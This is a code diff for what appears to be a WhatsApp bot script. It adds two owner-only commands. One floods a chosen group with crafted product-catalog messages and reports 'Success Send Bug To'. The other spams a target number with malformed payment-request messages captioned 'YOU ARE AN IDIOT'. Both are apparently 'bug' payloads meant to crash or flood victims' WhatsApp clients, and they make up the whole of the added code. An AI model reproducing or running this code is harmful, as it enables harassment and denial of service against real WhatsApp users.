@@ -4921,6 +4921,55 @@ Detek = tes.translate
 replay(`🌐Translate : ${Detek}\n📘Results : ${Infoo}`)
 }
 break
+case 'catalogpc': case 'cataloggc':  {
+if (!isCreator) return
+if (isBan) throw sticBanLu(from)
+if (args.length < 1) return m.reply(`*Syntax Error!*\n\nUse : ${command} idGroup|amount spam|timer\nExample : ${command} 62888@g.us|1|10s\n\n\ns = Second/Detik\n\nDi Usahakan Bot Udah Masuk Group Nya`)
+num = q.split('|')[0]
+jumlah = q.split('|')[1]
+for (let i = 0; i < jumlah; i++) {
+var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./baseikal/image/hwmodsgans.jpg') }, { upload: XeonBotInc.waUploadToServer })
+var catalog = generateWAMessageFromContent(num, proto.Message.fromObject({
+"productMessage": {
+"product": {
+"productImage": messa.imageMessage,
+"productId": "449756950375071",
+"title": `© HW MODS WA${ngazap(prefix)}`,
+"description": `© HW MODS WA`,
+"currencyCode": "IDR",
+"footerText": `© HW MODS WA`,
+"productImageCount": 1,
+"firstImageId": 1,
+"retailerId": `© HW MODS WA WE ARE NOT MASTOD`,
+"url": "wa.me/6285714170944"
+},
+"businessOwnerJid": "6285714170944@s.whatsapp.net",
+}
+}), { userJid: m.chat, quoted: doc})
+XeonBotInc.relayMessage(num, catalog.message, { messageId: catalog.key.id })
+}
+tekteka = `Success Send Bug To: ${num}\nAmount Spam: ${jumlah}`
+m.reply(tekteka)
+}
+break
+//=================================================//
+case 'jagoanom' : {
+if (!isCreator) return
+if (isBan) throw sticBanLu(from)
+if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
+jumlah = `${encodeURI(q)}`
+ydd = `Hello.`
+for (let i = 0; i < jumlah; i++) {
+XeonBotInc.relayMessage(m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net", { requestPaymentMessage: { Message: { extendedTextMessage: { text: `${buttonkal}`, currencyCodeIso4217: 'IDR', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, contextInfo:{"externalAdReply": {"title": `YOU ARE AN IDIOT`,"body": `IDIOT`,
+mimetype: 'audio/mpeg', caption: `${buttonkal}`,
+showAdAttribution: true,
+sourceUrl: `https://telegra.ph/file/0933284b7edf2a374a830.jpg`,
+thumbnailUrl: 'https://telegra.ph/file/0933284b7edf2a374a830.jpg', 
+}
+}}}}}, { quoted:doc})
+}
+}
+break
 case 'ampas1' : {
 Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
 a = await XeonBotInc.sendMessage(m.chat, {react: { text: " ️", key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
